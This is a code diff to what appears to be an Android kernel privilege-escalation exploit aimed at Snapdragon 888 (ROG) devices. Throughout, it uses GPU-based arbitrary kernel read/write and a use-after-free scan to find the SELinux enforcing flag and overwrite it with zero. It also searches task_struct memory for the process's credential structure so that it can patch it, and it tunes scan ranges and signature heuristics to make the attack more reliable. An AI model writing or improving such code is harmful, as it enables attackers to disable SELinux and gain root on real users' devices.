@@ -102,15 +102,15 @@ static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
     
     fprintf(stderr, "[SELINUX] Aggressive scan for enforcing bit around base 0x%lx...\n", (unsigned long)kbase);
     
-    // Scan for "selinuxu:object_r" string first to find rodata
+    // Anchor search: "selinuxu:object_r"
     uint64_t rodata_start = kbase + 0x2000000;
-    uint64_t rodata_end = kbase + 0x5000000;
+    uint64_t rodata_end = kbase + 0x6000000;
     uint8_t page[4096];
     uint64_t ctx_str_va = 0;
 
     for (uint64_t addr = rodata_start; addr < rodata_end; addr += 4096) {
         if (gpu_read_task_struct(fd, addr, page, 4096) == 0) {
-            for (int i = 0; i < 4096 - 16; i++) {
+            for (int i = 0; i < 4096 - 17; i++) {
                 if (memcmp(page + i, "selinuxu:object_r", 17) == 0) {
                     ctx_str_va = addr + i;
                     fprintf(stderr, "[SELINUX] Found context string at 0x%lx\n", (unsigned long)ctx_str_va);
@@ -121,15 +121,17 @@ static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
         if (ctx_str_va) break;
     }
 
-    // Now look for enforcing near typical offsets if string search fails or as additional check
+    // SELinux enforcing is usually in the same section as rodata/data
+    // Scan typical SD888 ranges
     uint64_t scan_ranges[][2] = {
-        {0x2f70000, 0x2f80000},
-        {0x3f70000, 0x3f80000},
-        {0x2bb0000, 0x2bc0000},
-        {0x2f00000, 0x3100000},
+        {0x2f70000, 0x3000000},
+        {0x30f0000, 0x3100000},
+        {0x2400000, 0x2800000},
+        {0x2b00000, 0x2d00000},
+        {0x3aad000, 0x3ab0000}, // Seen in ROG logs
     };
     
-    for (int r = 0; r < 4; r++) {
+    for (int r = 0; r < 5; r++) {
         uint64_t start = kbase + scan_ranges[r][0];
         uint64_t end = kbase + scan_ranges[r][1];
         
@@ -137,11 +139,11 @@ static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
             if (gpu_read_task_struct(fd, addr, page, 4096) == 0) {
                 for (int i = 0; i < 4096; i += 4) {
                     uint32_t val = *(uint32_t*)(page + i);
-                    if (val == 1) { // enforcing is usually 1
+                    if (val == 1) { 
                          uint64_t cand = addr + i;
-                         // On ROG, enforcing is often near these values
-                         uint32_t zero_check = 0;
-                         gpu_write_task_virt(fd, cand, (uint8_t*)&zero_check, 4);
+                         // Verify by toggling
+                         uint32_t zero = 0;
+                         gpu_write_task_virt(fd, cand, (uint8_t*)&zero, 4);
                          uint32_t verify = 1;
                          gpu_read_u32(fd, cand, &verify);
                          if (verify == 0) {
@@ -149,7 +151,6 @@ static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
                                      (unsigned long)cand, (unsigned long)(cand - kbase));
                              return cand;
                          }
-                         // Restore
                          uint32_t one = 1;
                          gpu_write_task_virt(fd, cand, (uint8_t*)&one, 4);
                     }
@@ -1305,24 +1306,51 @@ static void safe_cred_patch(void)
                 // Search for cred_ptr in a wide window around comm
                 fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID %d)...\n", my_uid);
                 int candidates_count = 0;
-                // Wide ROG search window: -4000 to +1000
-                for (int off = comm_off - 4000; off < comm_off + 1000; off += 8) {
-                    if (off < 0 || off > 16384 - 8) continue;
-                    uint64_t ptr = *(uint64_t *)(big_task_data + off);
-                    if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                        candidates_count++;
-                        uint8_t cred_check[128]; // ROG might have larger cred
-                        if (gpu_read_task_struct(fd, ptr, cred_check, 128) == 0) {
-                            for (int co = 0; co < 64; co += 4) {
-                                uint32_t uid = *(uint32_t *)(cred_check + co);
-                                if (uid == my_uid) {
-                                    cred_ptr = ptr;
-                                    fprintf(stderr, "[CHILD] [!!!] FOUND MATCHING CRED! ptr=0x%lx (UID found at +0x%x)\n", 
-                                            (unsigned long)cred_ptr, co);
+                
+                // Priority 1: Double pointers (real_cred + cred)
+                for (int off = comm_off - 2000; off < comm_off + 1000; off += 8) {
+                    if (off < 0 || off > 16384 - 16) continue;
+                    uint64_t p1 = *(uint64_t *)(big_task_data + off);
+                    uint64_t p2 = *(uint64_t *)(big_task_data + off + 8);
+                    if (p1 != 0 && p1 == p2 && (p1 & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                        uint8_t cc[256];
+                        if (gpu_read_task_struct(fd, p1, cc, 256) == 0) {
+                            for (int co = 0; co < 240; co += 4) {
+                                if (*(uint32_t *)(cc + co) == my_uid) {
+                                    cred_ptr = p1;
+                                    fprintf(stderr, "[CHILD] [!!!] MATCH FOUND (Double-ptr)! ptr=0x%lx (UID at +0x%x)\n", (unsigned long)cred_ptr, co);
                                     break;
                                 }
                             }
-                            if (cred_ptr) break;
+                        }
+                    }
+                    if (cred_ptr) break;
+                }
+
+                if (cred_ptr == 0) {
+                    // Priority 2: Full scan with signature detection
+                    for (int off = comm_off - 4000; off < comm_off + 1000; off += 8) {
+                        if (off < 0 || off > 16384 - 8) continue;
+                        uint64_t ptr = *(uint64_t *)(big_task_data + off);
+                        if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                            candidates_count++;
+                            uint8_t cred_check[256];
+                            if (gpu_read_task_struct(fd, ptr, cred_check, 256) == 0) {
+                                int uid_found_count = 0;
+                                for (int co = 0; co < 240; co += 4) {
+                                    uint32_t uid = *(uint32_t *)(cred_check + co);
+                                    if (uid == my_uid) {
+                                        uid_found_count++;
+                                        if (uid_found_count >= 2) { // Strong match
+                                            cred_ptr = ptr;
+                                            fprintf(stderr, "[CHILD] [!!!] MATCH FOUND (Scan)! ptr=0x%lx (UID at +0x%x, matches %d)\n", 
+                                                    (unsigned long)cred_ptr, co, uid_found_count);
+                                            break;
+                                        }
+                                    }
+                                }
+                                if (cred_ptr) break;
+                            }
                         }
                     }
                 }
@@ -2021,23 +2049,50 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                             uid_t my_uid = getuid();
                             fprintf(stderr, "      [*] Parent searching for cred_ptr in 16KB window (UID %d)...\n", my_uid);
                             int p_cand = 0;
-                            // ROG search window: -4000 to +1000
-                            for (int off = c_off - 4000; off < c_off + 1000; off += 8) {
-                                if (off < 0 || off > 16384 - 8) continue;
-                                uint64_t p = *(uint64_t *)(big_data + off);
-                                if ((p & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                                    p_cand++;
-                                    uint8_t cc[64];
-                                    if (gpu_read_task_struct(fd, p, cc, 64) == 0) {
-                                        for (int co = 0; co < 32; co += 4) {
-                                            if (*(uint32_t *)(cc + co) == my_uid) {
-                                                c_ptr = p;
-                                                fprintf(stderr, "      [P] [!!!] Parent found MATCHING CRED! ptr=0x%lx (UID at +0x%x)\n", 
-                                                        (unsigned long)c_ptr, co);
-                                                break;
+                            // Priority search: pointers that appear twice (real_cred and cred)
+                            for (int off = c_off - 2000; off < c_off + 1000; off += 8) {
+                                if (off < 0 || off > 16384 - 16) continue;
+                                uint64_t p1 = *(uint64_t *)(big_data + off);
+                                uint64_t p2 = *(uint64_t *)(big_data + off + 8);
+                                if (p1 != 0 && p1 == p2 && (p1 & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                                     fprintf(stderr, "      [P] [!] Double pointer found at offset 0x%x: 0x%lx. Testing as CRED...\n", off, (unsigned long)p1);
+                                     uint8_t cc[256];
+                                     if (gpu_read_task_struct(fd, p1, cc, 256) == 0) {
+                                         for (int co = 0; co < 240; co += 4) {
+                                             if (*(uint32_t *)(cc + co) == my_uid) {
+                                                 c_ptr = p1;
+                                                 fprintf(stderr, "      [P] [!!!] Parent found MATCH via double-ptr! ptr=0x%lx (UID at +0x%x)\n", (unsigned long)c_ptr, co);
+                                                 break;
+                                             }
+                                         }
+                                     }
+                                }
+                                if (c_ptr) break;
+                            }
+
+                            if (!c_ptr) {
+                                // Fallback: Scan all pointers
+                                for (int off = c_off - 4000; off < c_off + 1000; off += 8) {
+                                    if (off < 0 || off > 16384 - 8) continue;
+                                    uint64_t p = *(uint64_t *)(big_data + off);
+                                    if ((p & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                                        p_cand++;
+                                        uint8_t cc[256];
+                                        if (gpu_read_task_struct(fd, p, cc, 256) == 0) {
+                                            int uid_count = 0;
+                                            for (int co = 0; co < 240; co += 4) {
+                                                if (*(uint32_t *)(cc + co) == my_uid) {
+                                                    uid_count++;
+                                                    if (uid_count >= 2) { // Stronger match
+                                                        c_ptr = p;
+                                                        fprintf(stderr, "      [P] [!!!] Parent found MATCH via scan! ptr=0x%lx (UID at +0x%x, count %d)\n", 
+                                                                (unsigned long)c_ptr, co, uid_count);
+                                                        break;
+                                                    }
+                                                }
                                             }
+                                            if (c_ptr) break;
                                         }
-                                        if (c_ptr) break;
                                     }
                                 }
                             }
